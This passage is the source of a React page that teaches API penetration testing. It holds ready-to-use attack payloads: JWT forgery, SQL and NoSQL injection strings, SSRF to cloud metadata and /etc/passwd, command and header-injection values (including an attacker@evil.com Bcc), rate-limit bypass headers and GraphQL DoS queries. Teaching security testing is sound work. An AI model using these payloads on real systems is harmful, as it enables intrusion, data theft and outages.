import React, { useState } from "react";
import {
  Box,
  Typography,
  Container,
  Paper,
  alpha,
  useTheme,
  Tabs,
  Tab,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Chip,
  Grid,
  List,
  ListItem,
  ListItemIcon,
  ListItemText,
  IconButton,
  Alert,
  Card,
  CardContent,
  Tooltip,
} from "@mui/material";
import { useNavigate } from "react-router-dom";
import ArrowBackIcon from "@mui/icons-material/ArrowBack";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import ApiIcon from "@mui/icons-material/Api";
import SearchIcon from "@mui/icons-material/Search";
import LockIcon from "@mui/icons-material/Lock";
import SecurityIcon from "@mui/icons-material/Security";
import BugReportIcon from "@mui/icons-material/BugReport";
import SpeedIcon from "@mui/icons-material/Speed";
import DataObjectIcon from "@mui/icons-material/DataObject";
import CheckCircleIcon from "@mui/icons-material/CheckCircle";
import WarningIcon from "@mui/icons-material/Warning";
import InfoIcon from "@mui/icons-material/Info";
import ContentCopyIcon from "@mui/icons-material/ContentCopy";
import VpnKeyIcon from "@mui/icons-material/VpnKey";
import AdminPanelSettingsIcon from "@mui/icons-material/AdminPanelSettings";
import StorageIcon from "@mui/icons-material/Storage";
import CloudIcon from "@mui/icons-material/Cloud";
import HttpIcon from "@mui/icons-material/Http";
import DescriptionIcon from "@mui/icons-material/Description";
import CodeIcon from "@mui/icons-material/Code";
import SchemaIcon from "@mui/icons-material/Schema";
import TuneIcon from "@mui/icons-material/Tune";
import VisibilityIcon from "@mui/icons-material/Visibility";
import BlockIcon from "@mui/icons-material/Block";

interface TabPanelProps {
  children?: React.ReactNode;
  index: number;
  value: number;
}

function TabPanel(props: TabPanelProps) {
  const { children, value, index, ...other } = props;
  return (
    <div role="tabpanel" hidden={value !== index} {...other}>
      {value === index && <Box sx={{ pt: 3 }}>{children}</Box>}
    </div>
  );
}

// Code block component with copy functionality
function CodeBlock({ code, language = "bash" }: { code: string; language?: string }) {
  const theme = useTheme();
  const [copied, setCopied] = useState(false);

  const handleCopy = () => {
    navigator.clipboard.writeText(code);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <Paper
      sx={{
        p: 2,
        bgcolor: theme.palette.mode === "dark" ? "#1a1a2e" : "#1e1e1e",
        borderRadius: 2,
        position: "relative",
        overflow: "auto",
      }}
    >
      <Tooltip title={copied ? "Copied!" : "Copy"}>
        <IconButton
          size="small"
          onClick={handleCopy}
          sx={{
            position: "absolute",
            top: 8,
            right: 8,
            color: copied ? "success.main" : "grey.500",
          }}
        >
          <ContentCopyIcon fontSize="small" />
        </IconButton>
      </Tooltip>
      <Typography
        component="pre"
        sx={{
          fontFamily: "monospace",
          fontSize: "0.8rem",
          color: "#e0e0e0",
          m: 0,
          whiteSpace: "pre-wrap",
          wordBreak: "break-word",
        }}
      >
        {code}
      </Typography>
    </Paper>
  );
}

interface TopicSection {
  title: string;
  icon: React.ReactNode;
  color: string;
  description: string;
  keyPoints: string[];
  techniques?: string[];
  tools?: string[];
  tips?: string[];
  codeExample?: string;
}

// Tab 1: API Discovery & Enumeration
const discoveryTopics: TopicSection[] = [
  {
    title: "Finding API Endpoints",
    icon: <SearchIcon />,
    color: "#3b82f6",
    description: "Discover hidden and undocumented API endpoints through various reconnaissance techniques.",
    keyPoints: [
      "Check for /api/, /v1/, /v2/, /rest/, /graphql/ paths",
      "Analyze JavaScript files for hardcoded endpoints",
      "Use browser DevTools Network tab during normal usage",
      "Check mobile app traffic for API calls",
      "Search for Swagger/OpenAPI documentation",
      "Look for /docs, /swagger, /api-docs, /openapi.json",
      "Check robots.txt and sitemap.xml for API paths",
    ],
    tools: ["Burp Suite", "ffuf", "gobuster", "kiterunner", "GAP (GetAllUrls)", "LinkFinder"],
    techniques: [
      "ffuf -u https://api.target.com/FUZZ -w api-wordlist.txt",
      "Extract endpoints from JS: linkfinder -i https://target.com -o cli",
      "Check wayback machine: waybackurls target.com | grep api",
      "Enumerate with kiterunner: kr scan https://target.com -w routes.kite",
    ],
  },
  {
    title: "API Documentation Discovery",
    icon: <DescriptionIcon />,
    color: "#8b5cf6",
    description: "Find and analyze API documentation to understand available endpoints and parameters.",
    keyPoints: [
      "Swagger UI endpoints: /swagger, /swagger-ui, /swagger-ui.html",
      "OpenAPI spec files: /openapi.json, /openapi.yaml, /v3/api-docs",
      "GraphQL introspection: query { __schema { types { name } } }",
      "Postman collections in public repos or documentation",
      "WADL files for SOAP/REST: /application.wadl",
      "API Blueprint files: /api.apib, /blueprint",
    ],
    tools: ["Swagger Editor", "Postman", "GraphQL Voyager", "Insomnia"],
    tips: [
      "Always check if documentation is outdated vs actual implementation",
      "Undocumented endpoints often lack proper security controls",
      "Look for debug/test endpoints left in production",
      "Check for different documentation versions (/v1/docs vs /v2/docs)",
    ],
  },
  {
    title: "API Versioning & Technology Detection",
    icon: <CodeIcon />,
    color: "#10b981",
    description: "Identify API technologies, versions, and frameworks to tailor your testing approach.",
    keyPoints: [
      "Version in URL path: /api/v1/, /api/v2/",
      "Version in headers: Accept: application/vnd.api+json;version=2",
      "Version in query params: ?version=2",
      "Detect framework from error messages and headers",
      "Check Server, X-Powered-By, X-AspNet-Version headers",
      "Analyze JSON structure for framework patterns",
    ],
    techniques: [
      "Try accessing older API versions for deprecated insecure endpoints",
      "Check if v1 has less security than v2",
      "Look for version rollback vulnerabilities",
      "Test version parameter tampering",
    ],
  },
];

// Tab 2: Authentication Testing
const authTopics: TopicSection[] = [
  {
    title: "API Key Security",
    icon: <VpnKeyIcon />,
    color: "#ef4444",
    description: "Test API key implementation for common vulnerabilities and misconfigurations.",
    keyPoints: [
      "Check if API keys are transmitted securely (HTTPS only)",
      "Test for API key exposure in URLs, logs, or error messages",
      "Verify key rotation and revocation mechanisms",
      "Check for overly permissive key scopes",
      "Test if keys can be used from different IPs/origins",
      "Look for hardcoded keys in client-side code",
    ],
    techniques: [
      "Search JS files: grep -r 'api_key\\|apikey\\|api-key' .",
      "Check response headers for leaked keys",
      "Test key in different contexts (header vs query param)",
      "Attempt to use expired or revoked keys",
    ],
    tips: [
      "Many APIs accept keys in multiple places - test all locations",
      "Check if removing the key entirely allows access",
      "Test with malformed keys for information disclosure",
    ],
    codeExample: `# Common API key locations to test
curl -H "X-API-Key: <key>" https://api.target.com/endpoint
curl -H "Authorization: ApiKey <key>" https://api.target.com/endpoint
curl "https://api.target.com/endpoint?api_key=<key>"
curl -H "X-Api-Token: <key>" https://api.target.com/endpoint`,
  },
  {
    title: "JWT Attacks",
    icon: <DataObjectIcon />,
    color: "#f59e0b",
    description: "Exploit common JWT implementation flaws for authentication bypass.",
    keyPoints: [
      "Algorithm confusion: Change RS256 to HS256",
      "Algorithm none attack: Set alg to 'none'",
      "Weak secret keys vulnerable to brute force",
      "JWT header injection via jku, jwk, kid parameters",
      "Expired token acceptance",
      "Missing signature verification",
      "Sensitive data exposure in payload",
    ],
    tools: ["jwt_tool", "jwt.io", "hashcat", "Burp JWT Editor"],
    techniques: [
      "jwt_tool -t https://api.target.com -rh 'Authorization: Bearer <token>' -M at",
      "Change 'alg' to 'none' and remove signature",
      "Crack weak secrets: hashcat -a 0 -m 16500 jwt.txt wordlist.txt",
      "Inject JWKS URL via jku header parameter",
    ],
    codeExample: `# JWT None algorithm attack
# Original: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.signature

# Attack: Change header to {"alg":"none","typ":"JWT"}
# Result: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.

# Note: Remove signature but keep trailing dot`,
  },
  {
    title: "OAuth 2.0 Vulnerabilities",
    icon: <LockIcon />,
    color: "#8b5cf6",
    description: "Test OAuth implementations for authorization bypass and token theft.",
    keyPoints: [
      "Open redirect in redirect_uri parameter",
      "Authorization code interception/replay",
      "CSRF in OAuth flow (missing state parameter)",
      "Scope manipulation and privilege escalation",
      "Token leakage via Referer header",
      "Client secret exposure in mobile/SPA apps",
      "PKCE bypass attempts",
    ],
    techniques: [
      "Test redirect_uri: https://evil.com, subdomain takeover, path traversal",
      "Reuse authorization codes multiple times",
      "Remove or tamper with state parameter",
      "Request additional scopes not granted to the app",
      "Test implicit flow for token in URL fragment",
    ],
    tips: [
      "Check for token in URL - can leak via Referer",
      "Try downgrading from code flow to implicit",
      "Test if refresh tokens can be used across clients",
    ],
  },
  {
    title: "Session & Token Management",
    icon: <HttpIcon />,
    color: "#06b6d4",
    description: "Test API session handling and token lifecycle security.",
    keyPoints: [
      "Token expiration and refresh mechanisms",
      "Concurrent session handling",
      "Token revocation on logout/password change",
      "Session fixation vulnerabilities",
      "Token entropy and predictability",
      "Secure transmission (HTTPS, secure cookies)",
    ],
    techniques: [
      "Use old tokens after logout - should be invalidated",
      "Test token after password change",
      "Analyze token entropy with Burp Sequencer",
      "Check for session tokens in URLs",
      "Test token reuse across different user agents",
    ],
  },
];

// Tab 3: Authorization (BOLA/IDOR)
const authzTopics: TopicSection[] = [
  {
    title: "BOLA/IDOR Detection",
    icon: <AdminPanelSettingsIcon />,
    color: "#ef4444",
    description: "Broken Object Level Authorization - accessing other users' data by manipulating identifiers.",
    keyPoints: [
      "Test all endpoints with object IDs (user_id, order_id, etc.)",
      "Try sequential IDs: 1, 2, 3...",
      "Try UUIDs from other users if obtainable",
      "Check batch/bulk endpoints for mass data access",
      "Test GraphQL queries with different IDs",
      "Look for ID references in nested objects",
    ],
    techniques: [
      "Swap user IDs in: /api/users/{id}/profile",
      "Test: /api/orders/123 → /api/orders/124",
      "Enumerate: GET /api/documents/1 through /api/documents/1000",
      "Check if UUIDs are actually validated vs just checked for format",
    ],
    codeExample: `# BOLA/IDOR Testing with Burp Intruder or ffuf
# Step 1: Identify endpoints with object references
GET /api/v1/users/1001/orders
GET /api/v1/documents/abc-123-def

# Step 2: Enumerate with your user's token
ffuf -u https://api.target.com/users/FUZZ/profile \\
     -w ids.txt -H "Authorization: Bearer <your_token>" \\
     -mc 200 -o results.json

# Step 3: Check for data belonging to other users`,
    tips: [
      "Always test with two accounts - compare what each can access",
      "Check if DELETE/PUT also vulnerable, not just GET",
      "Look for indirect references (e.g., filename instead of ID)",
    ],
  },
  {
    title: "BFLA - Function Level Authorization",
    icon: <SecurityIcon />,
    color: "#dc2626",
    description: "Broken Function Level Authorization - accessing admin or privileged functions.",
    keyPoints: [
      "Access admin endpoints as regular user",
      "Test HTTP method switching (GET→POST→PUT→DELETE)",
      "Change user role in request body",
      "Access internal/debug endpoints",
      "Test admin API paths guessing",
    ],
    techniques: [
      "Try: /api/admin/users, /api/internal/config",
      "Change role parameter: {'role': 'admin'}",
      "Add admin parameters: ?admin=true, ?debug=1",
      "Test OPTIONS to discover allowed methods",
      "Check for different auth requirements per method",
    ],
    codeExample: `# Testing function-level authorization
# As regular user, try admin endpoints:
curl -X GET https://api.target.com/api/admin/users \\
     -H "Authorization: Bearer <regular_user_token>"

# Try method switching
curl -X DELETE https://api.target.com/api/users/123 \\
     -H "Authorization: Bearer <regular_user_token>"

# Try role elevation in request body
curl -X PUT https://api.target.com/api/users/me \\
     -H "Authorization: Bearer <token>" \\
     -d '{"role": "admin", "is_superuser": true}'`,
  },
  {
    title: "Horizontal vs Vertical Privilege Escalation",
    icon: <TuneIcon />,
    color: "#f59e0b",
    description: "Understanding and testing different types of privilege escalation in APIs.",
    keyPoints: [
      "Horizontal: Access same-level resources of other users",
      "Vertical: Escalate to higher privilege levels",
      "Context-dependent access control bypass",
      "Multi-tenant isolation failures",
      "Resource ownership manipulation",
    ],
    techniques: [
      "Horizontal: Change user_id/account_id in requests",
      "Vertical: Access /admin, change role claims, manipulate permissions",
      "Test tenant isolation: Add X-Tenant-ID or change org_id",
      "Check if deleting resources works across accounts",
    ],
    tips: [
      "Document the permission model before testing",
      "Test edge cases: empty IDs, null values, special characters",
      "Check if caching bypasses authorization checks",
    ],
  },
];

// Tab 4: Injection Attacks
const injectionTopics: TopicSection[] = [
  {
    title: "SQL Injection in APIs",
    icon: <StorageIcon />,
    color: "#ef4444",
    description: "SQL injection through API parameters, JSON bodies, and headers.",
    keyPoints: [
      "Test all input points: query params, JSON body, headers",
      "JSON injection: {\"id\": \"1 OR 1=1\"}",
      "Array parameters: ?id[]=1&id[]=2 OR 1=1",
      "Order by injection in sorting parameters",
      "Filter/search parameter injection",
    ],
    tools: ["SQLMap", "Burp Suite", "Ghauri"],
    techniques: [
      "sqlmap -u 'https://api.target.com/users?id=1' --batch",
      "Test JSON: {\"search\": \"test' OR '1'='1\"}",
      "Order by: ?sort=name,1;DROP TABLE users--",
      "In filters: ?filter={\"status\": {\"$ne\": null}}",
    ],
    codeExample: `# SQL Injection in JSON body
POST /api/search HTTP/1.1
Content-Type: application/json

{"query": "test' UNION SELECT username,password FROM users--"}

# In array parameters
GET /api/items?category[]=1&category[]=2 UNION SELECT * FROM secrets--

# In sorting/ordering
GET /api/users?sort=created_at;SELECT pg_sleep(5)--`,
  },
  {
    title: "NoSQL Injection",
    icon: <DataObjectIcon />,
    color: "#f59e0b",
    description: "Injection attacks against MongoDB, CouchDB, and other NoSQL databases.",
    keyPoints: [
      "MongoDB operator injection: $gt, $ne, $regex, $where",
      "JSON injection in query objects",
      "JavaScript injection via $where operator",
      "Array injection for operator bypass",
      "Blind NoSQL injection via timing",
    ],
    techniques: [
      "Replace value with object: {\"username\": {\"$ne\": \"\"}}",
      "Regex extraction: {\"password\": {\"$regex\": \"^a\"}}",
      "In URL: ?username[$ne]=&password[$ne]=",
      "JavaScript: {\"$where\": \"this.password.match(/^a/)\"}",
    ],
    codeExample: `# NoSQL injection examples
# Authentication bypass
POST /api/login
{"username": {"$ne": ""}, "password": {"$ne": ""}}

# Data extraction with regex
POST /api/users/search
{"password": {"$regex": "^admin"}}

# In query parameters
GET /api/users?username[$gt]=&password[$gt]=`,
  },
  {
    title: "SSRF via API Parameters",
    icon: <CloudIcon />,
    color: "#8b5cf6",
    description: "Server-Side Request Forgery through URL parameters and webhook configurations.",
    keyPoints: [
      "URL parameters: ?url=, ?callback=, ?redirect=",
      "Webhook/callback URLs in API configurations",
      "File import from URL features",
      "PDF generation with external resources",
      "Image/avatar URL fetching",
      "Cloud metadata access: 169.254.169.254",
    ],
    techniques: [
      "Test: ?url=http://127.0.0.1:8080/admin",
      "Cloud metadata: ?url=http://169.254.169.254/latest/meta-data/",
      "Port scanning: ?url=http://internal-host:PORT",
      "Protocol smuggling: ?url=file:///etc/passwd",
    ],
    codeExample: `# SSRF through API webhook configuration
POST /api/webhooks
{
  "callback_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}

# SSRF in file import
POST /api/import
{
  "source_url": "http://internal-service:8080/admin"
}

# DNS rebinding bypass
{
  "url": "http://attacker-controlled-domain.com"  
}
# (DNS resolves to internal IP after first check)`,
    tips: [
      "Try different URL schemes: http, https, file, gopher, dict",
      "Use DNS rebinding for IP-based filters",
      "Check for partial URL validation bypass",
    ],
  },
  {
    title: "Command & Header Injection",
    icon: <BugReportIcon />,
    color: "#dc2626",
    description: "OS command injection and HTTP header injection through API inputs.",
    keyPoints: [
      "Command injection in processing parameters",
      "File conversion/processing endpoints",
      "Report generation features",
      "Log injection via API inputs",
      "Header injection via parameter reflection",
    ],
    techniques: [
      "Test: {\"filename\": \"test; whoami\"}",
      "Newline injection: {\"header\": \"value\\r\\nX-Injected: true\"}",
      "In file operations: ?file=test.pdf|cat /etc/passwd",
      "Email parameter: test@test.com%0aBcc:attacker@evil.com",
    ],
  },
];

// Tab 5: Data Exposure
const dataTopics: TopicSection[] = [
  {
    title: "Excessive Data Exposure",
    icon: <VisibilityIcon />,
    color: "#ef4444",
    description: "APIs returning more data than necessary, exposing sensitive information.",
    keyPoints: [
      "Check all response fields for sensitive data",
      "Look for: passwords, tokens, PII, internal IDs",
      "Compare mobile app vs web app responses",
      "Test verbose error messages",
      "Check debug parameters: ?debug=true, ?verbose=1",
      "Analyze nested objects for hidden data",
    ],
    techniques: [
      "Compare full response vs what UI displays",
      "Request user profile - check for password hashes",
      "Look for internal fields: _id, internal_notes, etc.",
      "Check if filtering is client-side only",
    ],
    tips: [
      "Use jq to analyze JSON responses: curl ... | jq .",
      "Look for fields like: token, secret, key, password, hash",
      "Check if ?fields= parameter exposes restricted data",
    ],
    codeExample: `# Check for excessive data in responses
GET /api/users/me

# Vulnerable response:
{
  "id": 123,
  "username": "john",
  "email": "john@example.com",
  "password_hash": "$2b$12$...",  // Shouldn't be here!
  "api_key": "sk_live_...",       // Shouldn't be here!
  "internal_notes": "VIP customer",
  "ssn": "123-45-6789"            // PII exposure
}`,
  },
  {
    title: "Mass Assignment",
    icon: <DataObjectIcon />,
    color: "#f59e0b",
    description: "Modifying object properties that should be read-only by including them in requests.",
    keyPoints: [
      "Add extra fields to update requests",
      "Try modifying: role, is_admin, permissions, balance",
      "Check for writeable fields in GET responses",
      "Test nested object property injection",
      "Look for fields in documentation marked read-only",
    ],
    techniques: [
      "Add admin fields: {\"name\": \"test\", \"role\": \"admin\"}",
      "Modify balance: {\"amount\": 100, \"balance\": 999999}",
      "Change ownership: {\"user_id\": 1, \"owner_id\": 2}",
      "Inject nested: {\"profile\": {\"verified\": true}}",
    ],
    codeExample: `# Mass Assignment attack
# Normal update request:
PUT /api/users/123
{"name": "John", "email": "john@example.com"}

# Attack - add privileged fields:
PUT /api/users/123
{
  "name": "John",
  "email": "john@example.com",
  "role": "admin",
  "is_verified": true,
  "account_balance": 99999,
  "permissions": ["read", "write", "delete", "admin"]
}`,
  },
  {
    title: "Information Disclosure",
    icon: <InfoIcon />,
    color: "#8b5cf6",
    description: "Extracting sensitive information from error messages, headers, and metadata.",
    keyPoints: [
      "Verbose error messages with stack traces",
      "Database error messages revealing schema",
      "Server version in headers",
      "Debug endpoints left enabled",
      "API documentation with internal details",
      "Timing-based information disclosure",
    ],
    techniques: [
      "Trigger errors with invalid input types",
      "Send malformed JSON/XML",
      "Request non-existent resources for error details",
      "Check /debug, /status, /health, /metrics endpoints",
      "Analyze timing differences for valid vs invalid data",
    ],
  },
];

// Tab 6: Rate Limiting & DoS
const rateLimitTopics: TopicSection[] = [
  {
    title: "Rate Limit Bypass Techniques",
    icon: <SpeedIcon />,
    color: "#ef4444",
    description: "Circumventing API rate limiting and throttling mechanisms.",
    keyPoints: [
      "IP rotation via proxies or X-Forwarded-For",
      "User-Agent rotation",
      "API key rotation (if multiple available)",
      "Endpoint variation: /api/users vs /api/Users",
      "HTTP method variation: GET vs POST",
      "Parameter pollution to create unique requests",
    ],
    techniques: [
      "Add X-Forwarded-For: 127.0.0.1 header",
      "Try X-Real-IP, X-Originating-IP, X-Remote-IP",
      "URL case variation: /API/endpoint",
      "Add dummy parameters: ?_=timestamp",
      "Use HTTP/2 for parallel requests",
    ],
    codeExample: `# Rate limit bypass attempts
# IP spoofing headers
curl -H "X-Forwarded-For: 1.2.3.4" https://api.target.com/endpoint
curl -H "X-Real-IP: 5.6.7.8" https://api.target.com/endpoint
curl -H "X-Originating-IP: 9.10.11.12" https://api.target.com/endpoint

# Endpoint variations
/api/v1/login
/Api/V1/Login
/api/v1/login/
/api/v1/login?dummy=1

# Race condition with parallel requests
for i in {1..100}; do curl -s https://api.target.com/endpoint & done`,
  },
  {
    title: "Resource Exhaustion",
    icon: <BlockIcon />,
    color: "#dc2626",
    description: "Testing for denial of service through resource-intensive operations.",
    keyPoints: [
      "Large payload uploads",
      "Deeply nested JSON structures",
      "Regex DoS (ReDoS) in search parameters",
      "Expensive database queries",
      "File processing without limits",
      "GraphQL query complexity attacks",
    ],
    techniques: [
      "Send very large JSON body (megabytes)",
      "Deep nesting: {\"a\":{\"a\":{\"a\":...}}}",
      "Long strings in search: ?search=aaaa...×10000",
      "Many concurrent connections",
      "Request very large result sets: ?limit=999999",
    ],
    tips: [
      "Document rate limits and thresholds",
      "Test during off-peak hours with permission",
      "Be careful not to impact production services",
    ],
  },
  {
    title: "Batch & Bulk Endpoint Abuse",
    icon: <DataObjectIcon />,
    color: "#f59e0b",
    description: "Exploiting batch operations for data enumeration and bypass.",
    keyPoints: [
      "Batch endpoints may bypass rate limits",
      "Mass data retrieval via batch queries",
      "Batch operations for IDOR at scale",
      "GraphQL batching for parallel attacks",
    ],
    techniques: [
      "POST /api/batch [{\"id\": 1}, {\"id\": 2}, ...]",
      "GraphQL: [{query1}, {query2}, ...] in single request",
      "Test batch size limits",
      "Enumerate data via batch IDOR",
    ],
    codeExample: `# Batch endpoint abuse
POST /api/batch
[
  {"method": "GET", "path": "/users/1"},
  {"method": "GET", "path": "/users/2"},
  {"method": "GET", "path": "/users/3"},
  // ... hundreds more
]

# GraphQL batching
POST /graphql
[
  {"query": "{ user(id: 1) { email } }"},
  {"query": "{ user(id: 2) { email } }"},
  {"query": "{ user(id: 3) { email } }"}
]`,
  },
];

// Tab 7: GraphQL Specific
const graphqlTopics: TopicSection[] = [
  {
    title: "GraphQL Introspection",
    icon: <SchemaIcon />,
    color: "#e535ab",
    description: "Using GraphQL introspection to discover the entire API schema.",
    keyPoints: [
      "Introspection reveals all types, queries, mutations",
      "Find hidden or deprecated fields",
      "Discover internal-only operations",
      "Build schema documentation from introspection",
    ],
    tools: ["GraphQL Voyager", "InQL (Burp)", "graphql-cop", "Altair GraphQL Client"],
    codeExample: `# Full introspection query
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      fields {
        name
        args { name type { name } }
        type { name kind }
      }
    }
  }
}

# Simplified type discovery
query { __schema { types { name } } }

# Field discovery for a type
query { __type(name: "User") { fields { name } } }`,
  },
  {
    title: "GraphQL Injection & IDOR",
    icon: <BugReportIcon />,
    color: "#ef4444",
    description: "SQL injection, IDOR, and authorization bypass in GraphQL endpoints.",
    keyPoints: [
      "Injection in query arguments",
      "IDOR through ID arguments",
      "Authorization bypass in nested queries",
      "Batched queries for enumeration",
      "Mutation parameter manipulation",
    ],
    techniques: [
      "Test ID fields: query { user(id: \"1\") { ... } }",
      "SQL injection: query { user(id: \"1' OR '1'='1\") { ... } }",
      "Access nested private data through relationships",
      "Batch enumeration: [{query: user(1)}, {query: user(2)}...]",
    ],
    codeExample: `# IDOR in GraphQL
query {
  user(id: "other-user-id") {
    email
    password
    creditCards { number }
  }
}

# Injection attempt
query {
  searchUsers(name: "admin' OR '1'='1") {
    id
    email
  }
}

# Accessing private fields via relationships
query {
  publicPost(id: "1") {
    author {
      privateEmail  # May bypass direct user query auth
      internalNotes
    }
  }
}`,
  },
  {
    title: "GraphQL DoS Attacks",
    icon: <SpeedIcon />,
    color: "#f59e0b",
    description: "Denial of service through query complexity and depth attacks.",
    keyPoints: [
      "Deeply nested queries",
      "Circular relationship exploitation",
      "Alias-based query multiplication",
      "Large batch queries",
      "Field duplication attacks",
    ],
    techniques: [
      "Nest queries to maximum depth",
      "Use aliases to repeat expensive operations",
      "Exploit circular references: user→posts→author→posts→...",
      "Request all fields on large collections",
    ],
    codeExample: `# Depth attack - deeply nested query
query {
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends { email }
          }
        }
      }
    }
  }
}

# Alias attack - multiply operations
query {
  a1: user(id: 1) { expensive_field }
  a2: user(id: 1) { expensive_field }
  a3: user(id: 1) { expensive_field }
  # ... repeat 1000 times
}

# Circular reference abuse
query {
  user {
    posts {
      author {
        posts {
          author {
            posts { title }
          }
        }
      }
    }
  }
}`,
    tips: [
      "Check for query depth limits",
      "Test query complexity/cost analysis",
      "Look for timeout configurations",
    ],
  },
];

// Tab 8: Testing Checklist
const checklistItems = [
  {
    category: "Discovery & Recon",
    color: "#3b82f6",
    items: [
      "Enumerate all API endpoints",
      "Find API documentation (Swagger/OpenAPI)",
      "Identify API versions and test all",
      "Analyze JavaScript for hidden endpoints",
      "Check for GraphQL introspection",
      "Identify authentication mechanisms",
    ],
  },
  {
    category: "Authentication",
    color: "#8b5cf6",
    items: [
      "Test for default/weak credentials",
      "Test JWT algorithm confusion",
      "Test JWT secret brute force",
      "Check token expiration handling",
      "Test OAuth redirect_uri validation",
      "Verify logout invalidates tokens",
      "Test MFA bypass techniques",
    ],
  },
  {
    category: "Authorization",
    color: "#ef4444",
    items: [
      "Test BOLA/IDOR on all endpoints",
      "Test horizontal privilege escalation",
      "Test vertical privilege escalation",
      "Check admin endpoint access",
      "Test multi-tenant isolation",
      "Verify role-based access controls",
    ],
  },
  {
    category: "Input Validation",
    color: "#f59e0b",
    items: [
      "Test SQL injection in all parameters",
      "Test NoSQL injection",
      "Test command injection",
      "Test SSRF via URL parameters",
      "Test for mass assignment",
      "Test XSS in API responses",
    ],
  },
  {
    category: "Data Security",
    color: "#10b981",
    items: [
      "Check for excessive data exposure",
      "Analyze error messages for info leak",
      "Test debug endpoints",
      "Check for sensitive data in logs",
      "Verify PII handling",
      "Test data export features",
    ],
  },
  {
    category: "Rate Limiting & Availability",
    color: "#06b6d4",
    items: [
      "Test rate limiting implementation",
      "Attempt rate limit bypass",
      "Test resource exhaustion",
      "Check for GraphQL complexity limits",
      "Test batch endpoint abuse",
      "Verify timeout configurations",
    ],
  },
];

const tabSections = [
  { label: "Discovery", icon: <SearchIcon />, color: "#3b82f6" },
  { label: "Authentication", icon: <VpnKeyIcon />, color: "#8b5cf6" },
  { label: "Authorization", icon: <AdminPanelSettingsIcon />, color: "#ef4444" },
  { label: "Injection", icon: <BugReportIcon />, color: "#f59e0b" },
  { label: "Data Exposure", icon: <VisibilityIcon />, color: "#10b981" },
  { label: "Rate Limits", icon: <SpeedIcon />, color: "#06b6d4" },
  { label: "GraphQL", icon: <SchemaIcon />, color: "#e535ab" },
  { label: "Checklist", icon: <CheckCircleIcon />, color: "#ec4899" },
];

function TopicAccordion({ topics }: { topics: TopicSection[] }) {
  const theme = useTheme();

  return (
    <>
      {topics.map((topic, index) => (
        <Accordion
          key={topic.title}
          defaultExpanded={index === 0}
          sx={{
            mb: 2,
            border: `1px solid ${alpha(topic.color, 0.2)}`,
            borderRadius: "12px !important",
            "&:before": { display: "none" },
            overflow: "hidden",
          }}
        >
          <AccordionSummary
            expandIcon={<ExpandMoreIcon />}
            sx={{
              borderLeft: `4px solid ${topic.color}`,
              "&:hover": { bgcolor: alpha(topic.color, 0.02) },
            }}
          >
            <Box sx={{ display: "flex", alignItems: "center", gap: 2 }}>
              <Box
                sx={{
                  width: 40,
                  height: 40,
                  borderRadius: 2,
                  bgcolor: alpha(topic.color, 0.1),
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  color: topic.color,
                }}
              >
                {topic.icon}
              </Box>
              <Box>
                <Typography variant="h6" sx={{ fontWeight: 700 }}>
                  {topic.title}
                </Typography>
                <Typography variant="body2" color="text.secondary" sx={{ display: { xs: "none", sm: "block" } }}>
                  {topic.description}
                </Typography>
              </Box>
            </Box>
          </AccordionSummary>
          <AccordionDetails sx={{ pt: 0 }}>
            <Grid container spacing={3}>
              {/* Key Points */}
              <Grid item xs={12} md={6}>
                <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 2, color: topic.color }}>
                  📋 Key Points
                </Typography>
                <List dense disablePadding>
                  {topic.keyPoints.map((point, i) => (
                    <ListItem key={i} disableGutters sx={{ py: 0.5 }}>
                      <ListItemIcon sx={{ minWidth: 28 }}>
                        <CheckCircleIcon sx={{ fontSize: 16, color: topic.color }} />
                      </ListItemIcon>
                      <ListItemText primary={point} primaryTypographyProps={{ variant: "body2" }} />
                    </ListItem>
                  ))}
                </List>
              </Grid>

              {/* Techniques */}
              <Grid item xs={12} md={6}>
                {topic.techniques && (
                  <Box sx={{ mb: 3 }}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 2, color: "warning.main" }}>
                      ⚡ Techniques
                    </Typography>
                    <Paper
                      sx={{
                        p: 2,
                        bgcolor: alpha(theme.palette.warning.main, 0.03),
                        border: `1px solid ${alpha(theme.palette.warning.main, 0.15)}`,
                        borderRadius: 2,
                      }}
                    >
                      {topic.techniques.map((technique, i) => (
                        <Typography
                          key={i}
                          variant="body2"
                          sx={{
                            fontFamily: "monospace",
                            fontSize: "0.8rem",
                            mb: i < topic.techniques!.length - 1 ? 1 : 0,
                          }}
                        >
                          → {technique}
                        </Typography>
                      ))}
                    </Paper>
                  </Box>
                )}

                {topic.tools && (
                  <Box sx={{ mb: 2 }}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1.5 }}>
                      🛠️ Tools
                    </Typography>
                    <Box sx={{ display: "flex", flexWrap: "wrap", gap: 0.5 }}>
                      {topic.tools.map((tool) => (
                        <Chip
                          key={tool}
                          label={tool}
                          size="small"
                          sx={{
                            bgcolor: alpha(topic.color, 0.1),
                            color: topic.color,
                            fontWeight: 500,
                          }}
                        />
                      ))}
                    </Box>
                  </Box>
                )}
              </Grid>

              {/* Code Example */}
              {topic.codeExample && (
                <Grid item xs={12}>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 2 }}>
                    💻 Example
                  </Typography>
                  <CodeBlock code={topic.codeExample} />
                </Grid>
              )}

              {/* Tips */}
              {topic.tips && (
                <Grid item xs={12}>
                  <Alert
                    severity="info"
                    icon={<InfoIcon />}
                    sx={{
                      borderRadius: 2,
                      "& .MuiAlert-message": { width: "100%" },
                    }}
                  >
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>
                      💡 Pro Tips
                    </Typography>
                    <List dense disablePadding>
                      {topic.tips.map((tip, i) => (
